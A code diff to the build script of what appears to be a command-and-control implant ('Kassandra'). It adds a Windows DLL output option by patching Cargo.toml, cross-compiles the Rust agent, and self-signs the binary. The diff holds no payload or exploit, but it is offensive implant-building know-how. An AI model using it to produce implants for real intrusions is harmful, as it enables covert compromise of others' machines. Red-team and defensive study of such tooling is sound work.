@@ -28,7 +28,7 @@ class KassandraAgent(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose output format",
-            choices=["exe"],
+            choices=["exe", "dll"],
             default_value="exe"
         )
     ]                                             # Array if we want custom parameters during build
@@ -112,6 +112,8 @@ class KassandraAgent(PayloadType):
             StepStdout="All configuration setting applied",
             StepSuccess=True
         ))
+        output_format = self.get_parameter("output")
+
         rustUpCommand = "rustup +nightly target add x86_64-pc-windows-gnu"
         proc = await asyncio.create_subprocess_shell(
             rustUpCommand,
@@ -122,10 +124,30 @@ class KassandraAgent(PayloadType):
         print(stdout)
         print(stderr)
 
-        command = (
-            f"cargo +nightly-2025-04-30 build --release --target x86_64-pc-windows-gnu --manifest-path {agent_build_path.name}/kassandra/Cargo.toml"
-        )
-        filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
+        if output_format == "dll":
+            # Patch Cargo.toml for DLL build
+            cargo_path = pathlib.Path(agent_build_path.name) / "kassandra" / "Cargo.toml"
+            with open(cargo_path, "r") as f:
+                cargo_content = f.read()
+            # Switch reqwest to rustls — native SChannel fails in DLL context (AcceptSecurityContext)
+            cargo_content = cargo_content.replace(
+                'reqwest = { version = "0.12", features = ["blocking", "json"] }',
+                'reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }'
+            )
+            # Add [lib] section for cdylib output
+            cargo_content += '\n[lib]\ncrate-type = ["cdylib"]\npath = "src/lib.rs"\n'
+            with open(cargo_path, "w") as f:
+                f.write(cargo_content)
+            command = (
+                f"cargo +nightly-2025-04-30 build --release --lib --target x86_64-pc-windows-gnu --manifest-path {agent_build_path.name}/kassandra/Cargo.toml"
+            )
+            filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.dll"
+        else:
+            command = (
+                f"cargo +nightly-2025-04-30 build --release --bin kassandra --target x86_64-pc-windows-gnu --manifest-path {agent_build_path.name}/kassandra/Cargo.toml"
+            )
+            filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
+
         proc = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -143,7 +165,10 @@ class KassandraAgent(PayloadType):
             StepSuccess=True
         ))
         pfx_path = generate_self_signed_cert()
-        newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
+        if output_format == "dll":
+            newName = filename.replace("kassandra.dll", "kassandraSigned.dll")
+        else:
+            newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
         sign_with_osslsigncode(filename, newName, pfx_path, "infected")
 
         resp.payload = open(newName, "rb").read()
